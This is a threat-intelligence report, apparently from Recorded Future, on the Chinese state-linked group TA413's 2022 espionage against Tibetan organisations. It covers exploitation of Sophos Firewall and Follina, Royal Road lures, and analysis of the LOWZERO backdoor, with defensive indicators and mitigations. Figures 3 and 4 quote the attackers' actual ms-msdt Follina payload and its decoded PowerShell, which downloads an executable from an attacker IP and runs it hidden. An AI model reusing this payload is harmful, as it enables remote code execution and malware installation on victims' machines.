The activity was identified through a_\n_combination of large-scale automated network traffic analytics and expert analysis._\n_This report will be of most interest to individuals and organizations with strategic_\n_and operational intelligence requirements relating to Chinese cyber threat activity,_\n_as well as humanitarian and other organizations concerned with Tibetan interests._\n_With thanks to our colleagues at Sophos for early sharing and collaboration._\n\n#### Executive Summary\n\nRecorded Future’s analysts continue to observe targeting\nof ethnic and religious minority communities by Chinese statesponsored groups for surveillance and intelligence-gathering\npurposes. Previously, we covered activity of this nature that we\nattributed to RedAlpha. We have since identified an additional\ngroup that has been particularly relentless in its targeting of\nthe Tibetan community, commonly referred to in open source\nas TA413. Over the first half of 2022, we have observed TA413\nexploit a now-patched zero-day vulnerability targeting the\nSophos Firewall product (CVE-2022-1040), weaponize the\n“Follina” (CVE-2022-30190) vulnerability shortly after discovery\nand publication, and employ a newly observed custom backdoor\nwe track as LOWZERO in campaigns targeting Tibetan entities.\nThis willingness to rapidly incorporate new techniques and\nmethods of initial access contrasts with the group’s continued\nuse of well known and reported capabilities, such as the Royal\nRoad RTF weaponizer, and often lax infrastructure procurement\ntendencies.\n\n\n#### Key Judgments\n\n  - TA413 likely conducts cyber espionage on behalf of\n\nthe Chinese state. This assessment is based on the\ngroup’s persistent targeting of the Tibetan community\nfor intelligence-gathering purposes, use of custom\ncapabilities shared across other known Chinese statesponsored groups, and other technical evidence\nsupporting this attribution.\n\n  - TA413 is likely a consumer of a shared capability\n\ndevelopment pipeline serving multiple Chinese statesponsored groups, exemplified by the group’s continued\nuse of the Royal Road RTF builder, a shared zero-day\nexploit in Sophos Firewall observed in use by multiple\nChina-linked groups, and historical access to other\nshared malware families such as the TClient backdoor.\n\n  - In total, we observed at least 3 Chinese state-sponsored\n\ngroups targeting Sophos Firewall zero-day vulnerability\nCVE-2022-1040. More widely, this activity is further\n[evidence of both the continued](https://www.technologyreview.com/2022/02/28/1046575/how-china-built-a-one-of-a-kind-cyber-espionage-behemoth-to-last/) [increase in zero-day](https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2022GTR.pdf)\nuse by Chinese state-sponsored actors and the ongoing\nsharing of custom capabilities — including exploits —\nacross groups linked to China’s intelligence agencies.\n\n  - TA413 drops a new custom backdoor, LOWZERO,\n\ndeviating from using well known or open-source tooling.\n\n#### Background\n\nTA413 activity was first publicly [reported by Proofpoint in](https://www.proofpoint.com/us/blog/threat-insight/chinese-apt-ta413-resumes-targeting-tibet-following-covid-19-themed-economic)\nSeptember 2020 when the group was observed conducting\npersistent targeting of the Tibetan community, as well as briefly\ntargeting multiple European entities in the early months of the\nCOVID-19 pandemic. In this activity, TA413 used the Royal Road\nRTF weaponizer, which is shared across multiple Chinese statesponsored groups, in order to load a custom malware family\ntracked as Sepulcher. More historically, TA413 infrastructure and\nemail sender domains are linked to publicly reported ExileRAT\n[activity also targeting Tibetan entities, as well as the use of the](https://blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html)\nLuckyCat Android malware.\n\n[In February 2021, further TA413 activity was reported that](https://www.proofpoint.com/us/blog/threat-insight/ta413-leverages-new-friarfox-browser-extension-target-gmail-accounts-global)\nfeatured the use of a customized malicious Mozilla Firefox\nbrowser extension tracked as FriarFox. FriarFox allowed access\nand control of targeted users’ Gmail accounts and contacted\ncommand-and-control infrastructure associated with the\nJavascript reconnaissance framework Scanbox. This activity and\nother related TA413 campaigns around this time also targeted\norganizations and individuals associated with the Tibetan\ncommunity and featured continued use of Sepulcher and Royal\nRoad.\n\n\n-----\n\nSurprisingly, TA413 actors have regularly reused phishing\nemail sender addresses for up to several years (such as\ntseringkanyaq@yahoo[.]com and mediabureauin@gmail[.]com),\nallowing for the connection of disparate campaign activity\nto the group. We have also observed historical correlations\nbetween TA413 and publicly reported Tropic Trooper (Keyboy,\nPirate Panda) activity, suggesting a degree of overlap between\nthese clusters. For instance, a December 2018 campaign\nthat we observed targeting the Tibetan community used the\nsender email address mediabureauin@gmail[.]com historically\nassociated with TA413 activity, and also shared C2 infrastructure\noverlaps with the peopleoffreeworld[.]tk domain noted in the\n[Cisco Talos LuckyCat campaign. The infection chain ultimately](https://blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html)\nloaded the custom [TClient backdoor seen in historical Tropic](https://app.recordedfuture.com/live/sc/4kQA12PwEyd0)\n[Trooper activity reported by Citizen Lab, Trend Micro, and PWC.](https://citizenlab.ca/2018/08/familiar-feeling-a-malware-campaign-targeting-the-tibetan-diaspora-resurfaces/)\nBoth TA413- and Tropic Trooper-attributed activity also used the\n[URI string /qqqzqa. The use of TClient was also recently sighted](https://research.checkpoint.com/2022/chinese-actor-takes-aim-armed-with-nim-language-and-bizarro-aes/)\nby Check Point researchers bundled with a Chinese language\ngreyware, “SMS Bomber”.\n\nThere was also observable Infrastructure overlap between\nTropic Trooper activity and TA413 campaigns. For example, the\ndomain tibetnews[.]today referenced in [Citizen Lab and](https://citizenlab.ca/2018/08/familiar-feeling-a-malware-campaign-targeting-the-tibetan-diaspora-resurfaces/) [Trend](https://www.trendmicro.com/en_us/research/18/c/tropic-trooper-new-strategy.html?utm_campaign=shareaholic&utm_medium=twitter&utm_source=socialnetwork)\n[Micro reporting was hosted on Forewin Telecom IP Address](https://www.trendmicro.com/en_us/research/18/c/tropic-trooper-new-strategy.html?utm_campaign=shareaholic&utm_medium=twitter&utm_source=socialnetwork)\n118.99.13[.]68 until early 2019, which later hosted multiple Tibetthemed domains matching unique TA413 infrastructure tactics,\ntechniques, and procedures (TTPs). Importantly, the Citizen Lab\nreport discusses some ambiguity around public reporting on the\nTropic Trooper cluster that has conflated campaign and group\nnames. Furthermore, based on wider trends in Chinese cyberespionage activity, it is also highly plausible that these groups\nhave shared a capability and/or infrastructure pipeline, and that\nTA413 is a subset of wider Tropic Trooper activity.\n\n#### Threat/Technical Analysis\n\nOver the past several years, we have observed TA413 activity\nrelentlessly targeting organizations and individuals associated\nwith the Tibetan community. While the group has occasionally\nexpanded to a wider target set, targeting this community has been\na constant and is almost certainly indicative of one of the group’s\nprimary intelligence assignments. TA413 has also displayed an\nunusual mixture of consistency in using well publicized toolsets\nand infrastructure TTPs while also proving adaptable and agile\nin adopting zero-day or recently publicized vulnerabilities into\ninfection chains. In the section below, we highlight some notable\nTA413 campaign activity observed throughout 2022 to date.\n\n##### Analysis of Recent TA413 Campaign Activity\n\n\n##### Exploitation of Sophos Firewall Zero-Day\n\n[On March 25, 2022, Sophos published an advisory regarding](https://www.sophos.com/en-us/security-advisories/sophos-sa-20220325-sfos-rce)\na patched authentication bypass vulnerability allowing remote\ncode execution (RCE) in the User Portal and Webadmin of Sophos\nFirewall, which is tracked as CVE-2022-1040. According to the\nadvisory, Sophos observed this vulnerability being exploited to\ngain initial access to a small number of targeted organizations\nprimarily in the South Asia region. All affected organizations were\ninformed directly by Sophos. Subsequently, Volexity and Sophos\n[both published](https://news.sophos.com/en-us/2022/06/15/sophos-uncovers-how-apt-groups-carried-out-highly-targeted-attack/) [research regarding multiple likely Chinese state-](https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/)\nsponsored threat activity groups exploiting CVE-2022-1040. In\ntotal, we identified at least 3 distinct Chinese state-sponsored\nthreat activity groups with access to this exploit prior to public\nreporting, including TA413.\n\nThe targeting observed within TA413-attributed exploitation\nof CVE-2022-1040 aligned with the group’s typical activity.\nThe group used the Choopa (Vultr) IP address 192.46.213[.]63\nin post-exploitation activity, which hosted multiple known\nTA413 domains at the time. A second IP address used in postexploitation, 134.122.129[.]102, hosted applestatic[.]com at the\ntime of activity, which has historical hosting overlaps with the\nTA413 domain newsindian[.]xyz.\n\n**Network Indicator**\n\nfreetibet[.]in\n\njobflex[.]in\n\nflex-jobs[.]in\n\ntibetancongress[.]com\n\napplestatic[.]com\n\n192.46.213[.]63\n\n134.122.129[.]102\n\n_Table 1: Post-exploitation infrastructure linked to TA413 targeting of CVE-2022-1040 (Source:_\n_Recorded Future)_\n\n##### Continued Use of the Royal Road RTF Weaponizer\n\nTA413 continues to use variants of the shared Royal Road\nRTF weaponizer tool in targeted phishing attempts. Royal Road\nis [widely](https://nao-sec.org/2021/01/royal-road-redive.html) [shared across Chinese state-sponsored groups and](https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html)\nallows the creation of malicious RTF files intended to exploit\nvulnerabilities in Microsoft Equation Editor (CVE-2017-11882,\nCVE-2018-0798, CVE-2018-0802). In May 2022, we identified a\ntargeted spearphishing attempt against a Tibetan organization\ncontaining a link to a Royal Road sample hosted on the Google\nFirebase service. The group used the sender domain tibet[.]\nbet, which we had previously linked to TA413 activity based\non infrastructure characteristics specific to the group, while a\n[Proofpoint security researcher also attributed this campaign to](https://twitter.com/aRtAGGI/status/1526599650832265217)\nthe group.\n\n\n-----\n\nApplication-form-Sixmonth-work­ 9681ef910820d553e4cd54286f88\nshop-2022V1.doc 93850a3a57a29df7114c6a6b0d89\n\n362ff326\n\n_Table 2: TA413 MalDoc weaponized using Royal Road (Source: Recorded Future)_\n\nThe RTF drops a file named `dcnx18pwh.wmf which is`\nencoded using the XOR key `B2 A6 6D FF associated with a`\n[known Royal Road variant.

Further analysis of LOWZERO is included in the section\n**Malware Analysis: TA413’s Custom LOWZERO Backdoor.**\n\n_Figure 1: Tibetan language Royal Road lure used by TA413 (Source: Recorded Future)_\n\n##### Exploitation of MSDT Vulnerability CVE-2022-30190 (Follina)\n\n\nOn May 30, 2022, we identified a spearphishing attempt\ntargeting an entity associated with the Tibetan government-inexile. In this activity, the attackers spoofed the Central Tibetan\nAdministration and used a theme of a photography grant intended\nto support female photographers within the Tibetan community.\nThe phishing email again used the sender domain tibet[.]bet. The\nphishing email linked to a file hosted on a subdomain associated\nwith the Google Firebase service, tibet-gov.web[.]app, as also\n[referenced in subsequent open-source reporting by Proofpoint.](https://twitter.com/threatinsight/status/1531688214993555457)\n\nThe phishing emails were sent in 2 waves: the first linked\nto a Microsoft Word .docx attachment hosted on the Google\nFirebase service that attempts to use the Follina vulnerability,\nand a second linked to a .RAR archive file containing both the\nmalicious Microsoft Word attachment and a decoy .png image\nfile.\n\n**File Name** **SHA256 Hash**\n\nProgram and registration condi­ c984867923411b3823a39b9\ntions.docx 8672d1d98d1d093ea669f9b­\n\n2984c05a0cb3072444\n\n_Table 3: Malicious TA413 .docx file exploiting Follina vulnerability (Source: Recorded Future)_\n\n|File Name|SHA256 Hash|\n|---|---|\n|Application-form-Sixmonth-work­ shop-2022V1.doc|9681ef910820d553e4cd54286f88 93850a3a57a29df7114c6a6b0d89 362ff326|\n\n|File Name|SHA256 Hash|\n|---|---|\n|Program and registration condi­ tions.docx|c984867923411b3823a39b9 8672d1d98d1d093ea669f9b­ 2984c05a0cb3072444|\n\n\n-----\n\n_Figure 2: Contents of RAR file hosted on Google Firebase domain: decoy PNG file (left) and contents of malicious .docx file (right) (Source: Recorded Future)_\n\n\nOnce the Word document is opened, it attempts to retrieve an\nHTML file from a remote web server, http://65.20.75[.]158/poc.\nhtml.

At\nthe time of analysis, 65.20.75[.]158 also hosted the recently\nregistered Tibet-themed domains t1bet[.]net and airjaldi[.]online,\n[which spoofs the Indian ISP AirJaldi. Notably, AirJaldi runs the](https://airjaldi.com/networks/kangra-valley-internet-services-rural-broadband-service-provider)\nDharamshala Network which provides internet access to multiple\nTibetan entities.\n\n```\n ms-msdt:/id PCWDiagnostic /skip force /param \\”IT_Re­\n browseForFile=cal?c IT_LaunchMethod=ContextMenu\n IT_SelectProgram=NotListed IT_BrowseForFile=h$(­\n Invoke-Expression($(Invoke-Expression(‘[System.\n Text.Encoding]’+[char]58+[char]58+’UTF8.Get­\n String([System.Convert]’+[char]58+[char]58+’FromBase­\n 64String(‘+[char]34+’VHJ5IHskd2M9bmV3LW9iamVjdCBzeX­\n N0ZW0ubmV0LndlYmNsaWVudDskd2MuZG93bmxvYWRmaWxlKCJodHRwOi8­\n vNjUuMjAuNzUuMTU4LzA1MjR4ODYxMTAuZXhlIiwiJEVOVjp0ZW1wXH­\n dzdG1wLmV4ZSIpO30gQ2F0Y2gge0V4aXQoMSk7fTskY21kID0gIiRFT­\n lY6dGVtcFx3c3RtcC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2lu­\n ZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHJ1bmRsbD­\n MyLmV4ZSBwY3d1dGwuZGxsLExhdW5jaEFwcGxpY2F0aW9uICRjb­\n WQiOyRjbWQgPSAiYzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlI­\n jtTdGFydC1Qcm9jZXNzICRjbWQgLXdpbmRvd3N0eWxlIGhpZGRlbi­\n AtQXJndW1lbnRMaXN0ICIvYyB0YXNra2lsbCAvZiAvaW0gbXNkdC5le­\n GUiOw==’+[char]34+’))’))))i/../../../../../../../../../..\n /../../../../Windows/System32/mpsigstub.exe IT_AutoTrou­\n bleshoot=ts_AUTO\n\n```\n_Figure 3: ms-msdt command used by TA413 to execute Base64-encoded PowerShell command and_\n_download follow-on payload (Source: Recorded Future)_\n```\n Try {$wc=new-object system.net.webclient;$wc.download­\n\n```\nfile(“http://65.20.75[.]158/0524x86110.exe”,”$ENV:temp\\\nwstmp.exe”);} Catch {Exit(1);};$cmd = “$ENV:temp\\wstmp.\n```\n exe”;Start-Process $cmd -windowstyle hidden -ArgumentList\n\n```\n“/c rundll32.exe pcwutl.dll,LaunchApplication $cmd”;$cmd\n= “c:\\windows\\system32\\cmd.exe”;Start-Process $cmd -win­\ndowstyle hidden -ArgumentList “/c taskkill /f /im msdt.\n```\n exe”;\n\n```\n_Figure 4: Decoded PowerShell command (Source: Recorded Future)_\n\n\n-----\n\nThe downloaded file 0524x86110.exe is UPXpacked and has the SHA256 file hash 5217c2a1802b0b0f\ne 5 5 9 2 f 9 4 3 7 c d f d 2 1 f 8 7 d a 1 b 6 e b d c 9 1 7 6 7 9 e d 0 8 4\ne40096bfd. The unpacked UPX file also loads LOWZERO and\nuses the Choopa C2 IP address 45.77.45[.]222 for C2 over\nport TCP 110. Notably, 45.77.45[.]222 hosted the domain\ntibetyouthcongress[.]com at the time of this activity, which our\nanalysis also previously attributed to TA413.\n\n##### Other Tooling in Use by TA413\n\nFrom further analysis of TA413 activity, we also identified\nevidence that the group is likely using the open-source proxy tool\n[Stowaway. This is based on the identification of an ELF sample](https://github.com/ph4ntonn/Stowaway/blob/master/README_EN.md)\n(SHA256: 86f45f0d6778fda90a56ea8986a9124d768715af\n425784bbd1c371feeb2bfe68) configured to communicate with\nthe IP address 134.122.129[.]38, which was uploaded to public\nmalware repositories in close proximity to the time this IP hosted\nthe TA413 domain freetibet[.]in. Notably, Stowaway has also\nbeen observed in use by other likely Chinese state-sponsored\n[groups, per recent reporting by Kaspersky.](https://ics-cert.kaspersky.com/publications/reports/2022/06/27/attacks-on-industrial-control-systems-using-shadowpad/)\n\nAdditionally, through historical scanning data we identified\nan open directory present on a TA413-controlled server\n172.105.35[.]111 in June 2022. While this was no longer\naccessible at the time of discovery, one of the files present was\nnamed fscan_amd64. This is likely indicative of the group’s use\n[of the open-source internal network scanning tool fscan, which](https://github.com/shadow1ng/fscan/releases)\nuses a file of the same name. This tool was also observed in use\nby another suspected Chinese state-sponsored actor TAG-22\n(Bronze University, Earth Lusca, Fishmonger, Red Dev 10) by\n[Trend Micro researchers.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf)\n\n##### Victimology\n\nIn all of these recent campaigns, we have observed\nTA413 persistently targeting organizations associated with\nthe Tibetan community, including entities associated with\nthe Tibetan government-in-exile. While this appears to make\nup a large proportion of the group’s activity, open-source\nreporting also [identified short-lived TA413 activity targeting](https://www.proofpoint.com/us/blog/threat-insight/chinese-apt-ta413-resumes-targeting-tibet-following-covid-19-themed-economic)\nEuropean diplomatic and legislative bodies, non-profit policy\nresearch organizations, and global organizations dealing with\neconomic affairs during the early stages of COVID-19 in 2020.\nUsing Recorded Future Network Traffic Analysis (NTA), we also\nidentified infrastructure associated with multiple government\norganizations in Nepal and the corporate network of an Indian\nInternet Service Provider (ISP) regularly communicating with\nTA413 C2 infrastructure during the first half of 2022.\n\n##### Infrastructure Analysis\n\nTA413 continues to use a consistent set of infrastructure\n\n\nTTPs aligning with historical [public](https://www.proofpoint.com/us/blog/threat-insight/chinese-apt-ta413-resumes-targeting-tibet-following-covid-19-themed-economic) [reporting when procuring](https://www.proofpoint.com/us/blog/threat-insight/ta413-leverages-new-friarfox-browser-extension-target-gmail-accounts-global)\nand weaponizing operational infrastructure. The group has\npredominantly registered domains through GoDaddy and used\na combination of Forewin Telecom, Choopa (Vultr), and Linode\nfor hosting. Notably, a large majority of identified TA413 domains\nalso used the registrant organization name “asfasf”, likely due\nto consistent keyboard walking of the left hand keyboard home\nkeys. These TTPs also align with publicly attributed TA413\ndomains such as vaccine-icmr[.]net, as featured in historical\n[Proofpoint reporting.](https://www.proofpoint.com/us/blog/threat-insight/ta413-leverages-new-friarfox-browser-extension-target-gmail-accounts-global)\n\nTA413 also continues to largely use domains spoofing\norganizations associated with Tibet such as non-government\norganizations (like Tibetan National Congress and Tibetan Youth\nCongress) and media organizations (such as Tibet Times). The\ngroup has also registered domains spoofing wider organizations\nsuch as the remote working employment site FlexJobs and Indian\nnews firm Rediff News.\n\n**Domain** **Spoofed Organization**\n\ntibetancongress[.]com Tibetan National Congress\n\ntibetanyouthcongress[.]com Tibetan Youth Congress\n\ntibetyouthcongress[.]com Tibetan Youth Congress\n\ntibettimescategory[.]net Tibet Times\n\njobflex[.]in FlexJobs\n\nflex-jobs[.]in FlexJobs\n\nairjaldi[.]online AirJaldi\n\nrediffpapers[.]com Rediff[.]com News\n\n_Table 4: TA413 domains spoofing specific organizations (Source: Recorded Future)_\n\n#### Malware Analysis: TA413’s Custom LOWZERO Backdoor\n\nLOWZERO is a backdoor that, after profiling the infected\nmachine and sending the data to the command-and-control\nserver, will receive additional modules to run. We believe the\nmodules are only delivered and executed if the fingerprinted\nmachine is of interest to the actors, as we did not observe any\nadditional modules while executing within a sandbox environment.\nThe modules likely expand upon the basic backdoor functionality\nresiding in LOWZERO. LOWZERO is also capable of proxying\ncommunication received via the network listener out through\nanother connection, defined based upon prior data received.\n\nThe following analysis was performed on a sample of\nthe malware with SHA256 hash 5217c2a1802b0b0fe5592f9\n437cdfd21f87da1b6ebdc917679ed084e40096bfd\n\n|Domain|Spoofed Organization|\n|---|---|\n|tibetancongress[.]com|Tibetan National Congress|\n|tibetanyouthcongress[.]com|Tibetan Youth Congress|\n|tibetyouthcongress[.]com|Tibetan Youth Congress|\n|tibettimescategory[.]net|Tibet Times|\n|jobflex[.]in|FlexJobs|\n|flex-jobs[.]in|FlexJobs|\n|airjaldi[.]online|AirJaldi|\n|rediffpapers[.]com|Rediff[.]com News|\n\n\n-----\n\n##### Layers to Execution\n\nThe LOWZERO execution chain contains multiple layers/\nstages:\n\n**• Stage 1 — Decompresses an embedded DLL file (stage 2)**\n\nbefore XOR decrypting it and executing it\n\n**• Stage 2 — Launches rundll32.exe in a suspended state**\n\nand injects the Stage 3 DLL into it; then it calls the\nDllEntryPoint and the exported function F exposed by the\nStage 3 DLL\n\n**• Stage 3 — Exported function F contains the backdoor**\n\nfunctionality\n\n_Figure 5: LOWZERO loading process (Source: Recorded Future)_\n\n##### Config BreakDown\n\nLOWZERO’s configuration information is passed in as a buffer\nto Stage 3’s exported function F. The configuration data is both\nencrypted and compressed. The decompression algorithm is\napplied after the not operator is applied to decrypt the buffer.\n[The decompression algorithm is likely LZF (Lempel-Ziv-Free).](https://fastapi.metacpan.org/source/MLEHMANN/Compress-LZF-3.8/LZF.pm)\nThis same decompression algorithm is also used to decompress\nthe Stage 2 dll and is used as part of the encryption / decryption\nscheme for C2 communication.\n\n\n-----\n\n_Figure 6: Encrypted and compressed configuration data (Source: Recorded Future)_\n\n**Figure 7 shows the contents of the configuration information**\nbuffer after decryption and decompression.\n\n_Figure 7: Decrypted and decompressed configuration data (Source: Recorded Future)_\n\n\n-----\n\nThe campaign ID is used as the mutex and can be extracted\nfrom the configuration data.

However,\nthe TLS connection is custom and does not adhere to the\n[protocol standard, and was likely created to look like TLS on the](https://www.rfc-editor.org/rfc/rfc5246.html)\nsurface. This helps the communication to blend in with other\nTLS traffic while allowing the actor not to worry about certificate\nprocurement or management.\n\nThe communication starts with the [standard TLS](https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/)\nhandshake components _Client Hello and_ _Server Hello. During_\nthe Server Key Exchange the C2 passes the EC (Elliptic Curve)\nDiffie-Hellman public key of _b113bc93dcd87d350850b7f_\n_d643c2c5aee678c3dcb717d1296b0cf57c749f0ab. It is important_\nto note that both of the C2s we identified use the same public\nkey.\n\nAfter the TLS hello packets are sent, LOWZERO exchanges\nits EC Diffie-Hellman public key with the C2, which the backdoor\nrandomly generates at runtime, meaning that each C2 session\nwill have a different public key. Figure 8 shows the TLS version\n1.1 handshake from the LOWZERO backdoor to the C2.\n\n_Figure 8: LOWZERO TLS version 1.1 handshake (Source: Recorded Future)_\n\n\nUp until this point, the C2 connection has seemingly followed\nthe standard TLS 1.1 handshake. In a standard implementation\nof TLS, when data is exchanged between a client / server, the\nprocess is to use asymmetric encryption to securely exchange\nthe symmetric key and then switch to the symmetric encryption\nas it’s faster. However, this is where LOWZERO breaks protocol\nand doesn’t use public key encryption to securely transfer the\nsymmetric key. Instead, the Random Bytes from the Client Hello\npacket and the Random Bytes from the Server Hello packet are\nXORed together to derive a key for the AES encryption algorithm\nthat is used to decrypt / encrypt the C2 communication.\n\n_Figure 9: LOWZERO AES encryption / decryption key creation (Source: Recorded Future)_\n\n##### LOWZERO Initialization Packet\n\nAfter the TLS handshake and the deriving of the AES key,\nLOWZERO sends the following basic system and user information\nto the C2:\n\n1. Username\n\n2. Campaign ID\n\n3. Process name and Process ID\n\n4. IP Address\n\n5. Hostname\n\n|C2 IP Address|45.77.45[.]222|\n|---|---|\n|C2 Port|TCP 110|\n|TLSv1.1 Server Name|static-global-s-msn-com. akamaized[.]net|\n|Network Creation Option|0x1|\n\n\n-----\n\nThe data is then encoded and encrypted using the below\nLOWZERO custom scheme and is also depicted in Figure 10.\n\n1. LZF-compressed\n\n2. XORed with 0x2b\n\n3. Base64-encoded with the custom alphabet\n\n4. AES-encrypted with randomly generated key (provided\n\nin C2 transmission)\n\n5. AES-encrypted with derived key from the XOR of the\nClient / Server Random Bytes Key\n\nDecryption of the traffic is possible by simply reversing the\noperations above.\n\n_Figure 10: LOWZERO C2 encryption scheme (Source: Recorded Future)_\n\n**Figure 11 shows the C2 communication structure representing**\nthe decrypted AES traffic to and from the C2. The core parts of\nthe response are the Command (0x06) and the Command Data\n(0x0C).\n\n_Figure 11: LOWZERO C2 communication structure (Source: Recorded Future)_\n\n\n-----\n\n##### LOWZERO Commands\n\nLOWZERO has the ability to receive 1 or more commands at\na time (see Figure 11 for command structure) and then execute\neach of them one at a time. The function at offset 0x10005090\nhandles the header check that confirms the presence of the\nbytes representing the ASCII values _PK at the start of the_\ncommand section, prior to parsing and running the commands.\nThe command choices are:\n\n**Command Code** **Action**\n\n2000 Base64-decode, xor-decrypt, and LZF-decom­\npress the command data before loading it into\nthe command data variable\n\n2001 Clear command data variable\n\n2002 Set communication delay time\n\n2003 Exit command loop\n\n2004 Close Connection Flag\n\n2005 Load module received over the network\n\n2006 Run module loaded\n\nDefault Spin up a listener for proxying communication\n\n(Additional checks after entry into this branch\nare done before spinning up the listener)\n\n_Table 6: LOWZERO commands (Source: Recorded Future)_\n\n#### We were unable to recover any modules from the C2, and as a result, are unable to determine what capabilities the modules add to LOWZERO.\n\n##### Weak C2 Protocol\n\nWe were able to decrypt captured communication as the\nAES key is derived from the TLS handshake itself. This allows us\nto review the commands sent and provides us an opportunity to\nextract out any modules delivered to the victim machine. Details\nare provided in Appendix C.\n\n\n#### Mitigations\n\n  - Configure your intrusion detection systems (IDS),\nintrusion prevention systems (IPS), or any network\ndefense mechanisms in place to alert on — and upon\nreview, consider blocking connection attempts to and\nfrom — the external IP addresses and domains linked in\n**Appendix A.**\n\n  - Ensure security monitoring and detection capabilities\nare in place for all external-facing services and devices.\nMonitor for follow-on activity likely to take place\nfollowing exploitation of these external-facing services,\nsuch as the deployment of webshells, backdoors, or\nreverse shells.\n\n  - Ensure a risk-based approach for patching of\nvulnerabilities, prioritizing high-risk vulnerabilities and\nthose being exploited in the wild as determined through\n[the Recorded Future Vulnerability Intelligence module.](https://www.recordedfuture.com/license-options/)\n\n  - Monitor for domain abuse, such as typosquat domains\nspoofing your organization and vendors, through the\n[Recorded Future Brand Intelligence module.](https://www.recordedfuture.com/license-options/)\n\n  - Employ detection and hardening coverage for the MITRE\nATT&CK techniques highlighted in Appendix B.\n\n|Command Code|Action|\n|---|---|\n|2000|Base64-decode, xor-decrypt, and LZF-decom­ press the command data before loading it into the command data variable|\n|2001|Clear command data variable|\n|2002|Set communication delay time|\n|2003|Exit command loop|\n|2004|Close Connection Flag|\n|2005|Load module received over the network|\n|2006|Run module loaded|\n|Default|Spin up a listener for proxying communication (Additional checks after entry into this branch are done before spinning up the listener)|\n\n\n-----\n\n#### Outlook\n\nOur research identified persistent targeting of the Tibetan\ncommunity in the first half of 2022 from the probable Chinese\nstate-sponsored threat activity group TA413. The group\ncontinues to incorporate new capabilities while also relying on\ntried-and-tested TTPs. In particular, the stark contrast between\nsome of the tooling employed by the group versus infrastructure\nmanagement practices is likely indicative of separate teams\ninvolved in the development of malware and exploits versus\nthose conducting operations. While mainly focused on Tibetan\ntargeting, TA413 also has multiple historical infrastructure and\nmalware ties to the group known as Tropic Trooper (Keyboy,\nPirate Panda) that are indicative of some degree of operational\noverlap. More widely, TA413’s adoption of both zero-day and\nrecently published vulnerabilities is indicative of wider trends\nwith Chinese cyber-espionage groups whereby exploits regularly\nappear in use by multiple distinct Chinese activity groups prior\nto their widespread public availability.\n\n\n-----\n\n#### Appendix A: Indicators of Compromise\n\nReaders can access the TA413 indicators observed

Appendix C: Weak C2 Protocol Analysis\n\nSince the C2 TLS connection doesn’t use public/private key encryption and because the AES key is derived from the TLS\nhandshake itself, we can decrypt the network traffic captured between the C2 and LOWZERO. We did so in an online submission of\nLOWZERO found in AnyRun. To do this, we created a Python script that: takes the client random bytes, server random bytes, and\nthe encrypted data as arguments; performs the two rounds of AES decryption; and then parses the C2 communication structure\nto get the command identifier and the command data. The command data is then custom base64-decoded, XOR-decoded, and\ndecompressed.\n\nWe decoded the below LOWZERO commands received from the AnyRun submission PCAP. We observed that\nafter the initialization packet, the C2 will respond with the command 2000, which decodes the command data to\n225c218c74bd855c071d972d61a3f5278b0e1cb5. This value appears to be some type of identifier the client uses to check-in\nwith the C2, as LOWZERO sends this value back to C2 in response to both the 2000 and 2002 (Set Communication Time Delay)\n[commands. A Python script to decode LOWZERO C2 network traffic can be found on our GitHub repository here.](https://github.com/Insikt-Group/Research/tree/master/LOWZERO)\n\n_Figure 12: LOWZERO-extracted C2 communication (Source: Recorded Future)_\n\n\n-----\n\nData sources for this report include the Recorded Future® Platform, SecurityTrails,\n\nPolySwarm, DomainTools Iris, Team Cymru’s Pure Signal™, and common open-source\n\ntools and techniques.\n\nAbout Insikt Group[®]\n\nRecorded Future’s Insikt Group, the company’s threat research division, comprises\n\nanalysts and security researchers with deep government, law enforcement, military, and\n\nintelligence agency experience.
